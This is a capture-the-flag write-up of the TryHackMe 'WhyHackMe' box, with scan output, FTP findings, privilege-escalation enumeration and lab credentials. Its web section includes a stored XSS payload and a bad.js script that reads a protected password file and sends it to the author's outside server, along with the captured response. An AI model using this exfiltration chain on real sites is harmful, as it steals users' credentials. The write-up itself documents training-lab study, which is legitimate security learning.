# BOX NAME: WhyHackMe
**LINK**: https://tryhackme.com/room/whyhackme#

<details open><summary><ins>SUMMARY</ins></summary>

```
1. 
2. 
3. 
4. 
5.

```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.10.108.254
[+] URL:	http://10.10.108.254
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
┌──(jml㉿comp)-[/base/git/writeups/TryHackMe/WhyHackMe]
└─$ sudo nmap -p- 10.10.108.254 -oN nmap.log
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-19 18:07 CET
Nmap scan report for 10.10.108.254
Host is up (0.056s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE
21/tcp    open     ftp
22/tcp    open     ssh
80/tcp    open     http
41312/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 137.47 seconds
```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan
```
└─$ whatweb 10.10.108.254
http://10.10.108.254 [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], HttpOnly[PHPSESSID], IP[10.10.108.254], Title[Welcome!!]
```

nikto-scan
```

```

fuzzing
```
┌──(jml㉿comp)-[/base/git/writeups/TryHackMe/WhyHackMe]
└─$ ffuf -u http://10.10.108.254/FUZZ -w /base/dbase/wordlists/web-fuzz/directory-list-2.3-big.txt -e .php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.108.254/FUZZ
 :: Wordlist         : FUZZ: /base/dbase/wordlists/web-fuzz/directory-list-2.3-big.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.php               [Status: 200, Size: 563, Words: 39, Lines: 30, Duration: 81ms]
login.php               [Status: 200, Size: 523, Words: 45, Lines: 21, Duration: 161ms]
register.php            [Status: 200, Size: 643, Words: 36, Lines: 23, Duration: 76ms]
dir                     [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 75ms]
assets                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 81ms]
blog.php                [Status: 200, Size: 3102, Words: 422, Lines: 23, Duration: 8490ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 60ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 58ms]
.php                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 79ms]
                        [Status: 200, Size: 563, Words: 39, Lines: 30, Duration: 80ms]

```
other
```
So my train of thought is there is a XSS or SSRF. Said and done.
in the "NAME" of a new registered user who posts a blog entry can manipulate the client side of a victim.

We know there is a pass.txt file to be read.
So I created a quick .js 

XSS Payload:
<script src="http://10.14.47.209/bad.js"</script>


bad.js script:
'''
// Fetch the contents of /dir/pass.txt
fetch('/dir/pass.txt')
  .then(response => {
    return response.text();
  })
  .then(data => {
    // Send the contents to another web server
    const targetURL = 'http://10.14.47.209/thisistheshit?=' + data;
    // Perform a GET request to the other web server
    fetch(targetURL)
      .then(response => {
        return response.text();
      })
  })

'''

Response catched by my own web-server:

10.10.169.145 - - [19/Jan/2024 21:38:08] "GET /thisistheshit?=jack:WhyIsMyPasswordSoStrongIDK HTTP/1.1" 404 -
```

</details>

<details><summary><ins>SERVICES</ins></summary>

FTP
```
anonymous login works.
update.txt found!

'''
└─$ cat update.txt 
Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account. 
- admin
'''
```

SSH
```

```

SNMP
```

```

DNS
```

```

MAILSERVICES (POP, IMAP, SMTP)
```

```

LDAP
```

```

</details>

<details><summary><ins>Active Directory</ins></summary>

Active Directory
```

```
</details>

<details><summary><ins>SUMMARY REMOTE</ins></summary>

```
1.
2.
3.
```
</details>

# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```

```

**SUID's**:

```
find / -perm -u=s -type f 2>/dev/null
-D
jack@ubuntu:~$ find / -perm -u=s -type f 2>/dev/null
/snap/snapd/20092/usr/lib/snapd/snap-confine
/snap/snapd/19457/usr/lib/snapd/snap-confine
/snap/core22/864/usr/bin/chfn
/snap/core22/864/usr/bin/chsh
/snap/core22/864/usr/bin/gpasswd
/snap/core22/864/usr/bin/mount
/snap/core22/864/usr/bin/newgrp
/snap/core22/864/usr/bin/passwd
/snap/core22/864/usr/bin/su
/snap/core22/864/usr/bin/sudo
/snap/core22/864/usr/bin/umount
/snap/core22/864/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core22/864/usr/lib/openssh/ssh-keysign
/snap/core22/858/usr/bin/chfn
/snap/core22/858/usr/bin/chsh
/snap/core22/858/usr/bin/gpasswd
/snap/core22/858/usr/bin/mount
/snap/core22/858/usr/bin/newgrp
/snap/core22/858/usr/bin/passwd
/snap/core22/858/usr/bin/su
/snap/core22/858/usr/bin/sudo
/snap/core22/858/usr/bin/umount
/snap/core22/858/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core22/858/usr/lib/openssh/ssh-keysign
/snap/core20/2015/usr/bin/chfn
/snap/core20/2015/usr/bin/chsh
/snap/core20/2015/usr/bin/gpasswd
/snap/core20/2015/usr/bin/mount
/snap/core20/2015/usr/bin/newgrp
/snap/core20/2015/usr/bin/passwd
/snap/core20/2015/usr/bin/su
/snap/core20/2015/usr/bin/sudo
/snap/core20/2015/usr/bin/umount
/snap/core20/2015/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2015/usr/lib/openssh/ssh-keysign
/snap/core20/1974/usr/bin/chfn
/snap/core20/1974/usr/bin/chsh
/snap/core20/1974/usr/bin/gpasswd
/snap/core20/1974/usr/bin/mount
/snap/core20/1974/usr/bin/newgrp
/snap/core20/1974/usr/bin/passwd
/snap/core20/1974/usr/bin/su
/snap/core20/1974/usr/bin/sudo
/snap/core20/1974/usr/bin/umount
/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1974/usr/lib/openssh/ssh-keysign
/snap/chromium/2599/usr/lib/chromium-browser/chrome-sandbox
/snap/chromium/2607/usr/lib/chromium-browser/chrome-sandbox
/usr/bin/su
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/at
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/umount
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign

```
**SGID's**:

```
find / -perm -g=s -type f 2>/dev/null

jack@ubuntu:~$ find / -perm -g=s -type f 2>/dev/null
/snap/core22/864/usr/bin/chage
/snap/core22/864/usr/bin/expiry
/snap/core22/864/usr/bin/ssh-agent
/snap/core22/864/usr/bin/wall
/snap/core22/864/usr/sbin/pam_extrausers_chkpwd
/snap/core22/864/usr/sbin/unix_chkpwd
/snap/core22/858/usr/bin/chage
/snap/core22/858/usr/bin/expiry
/snap/core22/858/usr/bin/ssh-agent
/snap/core22/858/usr/bin/wall
/snap/core22/858/usr/sbin/pam_extrausers_chkpwd
/snap/core22/858/usr/sbin/unix_chkpwd
/snap/core20/2015/usr/bin/chage
/snap/core20/2015/usr/bin/expiry
/snap/core20/2015/usr/bin/ssh-agent
/snap/core20/2015/usr/bin/wall
/snap/core20/2015/usr/sbin/pam_extrausers_chkpwd
/snap/core20/2015/usr/sbin/unix_chkpwd
/snap/core20/1974/usr/bin/chage
/snap/core20/1974/usr/bin/expiry
/snap/core20/1974/usr/bin/ssh-agent
/snap/core20/1974/usr/bin/wall
/snap/core20/1974/usr/sbin/pam_extrausers_chkpwd
/snap/core20/1974/usr/sbin/unix_chkpwd
/usr/sbin/pam_extrausers_chkpwd
/usr/sbin/unix_chkpwd
/usr/bin/wall
/usr/bin/ssh-agent
/usr/bin/expiry
/usr/bin/at
/usr/bin/bsd-write
/usr/bin/crontab
/usr/bin/chage
/usr/lib/x86_64-linux-gnu/utempter/utempter
```
**OTHERS**:

```
/opt:
total 40
drwxr-xr-x  2 root root  4096 Aug 16 15:18 ./
drwxr-xr-x 19 root root  4096 Mar 14  2023 ../
-rw-r--r--  1 root root 27247 Aug 16 18:13 capture.pcap
-rw-r--r--  1 root root   388 Aug 16 15:18 urgent.txt

jack@ubuntu:/opt$ cat urgent.txt 
Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting these files first.


drwxr-x---  2 root h4ck3d   4096 Aug 16 14:29 cgi-bin/


I FOUND SOME GOOD STUFF IN THE PCAP FILE.
GET /cgi-bin/5UP3r53Cr37.py HTTP/1.1
```
</details>


# LOOT

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*
```
jack@ubuntu:~$ file /bin/bash ; echo -e " \n" && lsb_release -a ; echo -e "\n" && uname -a
/bin/bash: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2a9f157890930ced4c3ad0e74fc1b1b84aad71e6, for GNU/Linux 3.2.0, stripped
 

No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 20.04.5 LTS
Release:        20.04
Codename:       focal


Linux ubuntu 5.4.0-144-generic #161-Ubuntu SMP Fri Feb 3 14:49:04 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password

jack:WhyIsMyPasswordSoStrongIDK
```
```
^Cjack@ubuntu:/var/www/html$ cat config.php
<?php
$servername = "localhost";
$username = "root";
$password = "MysqlPasswordIsPrettyStrong";
$dbname = "commentDB";
?>
``` 
</details>

<details><summary><ins>HASHES:</ins></summary>

```

```
</details>

# PROOFS

<details><summary><ins>Proofs</ins></summary>

Final payload:
```

```

```

```

```

```

</details>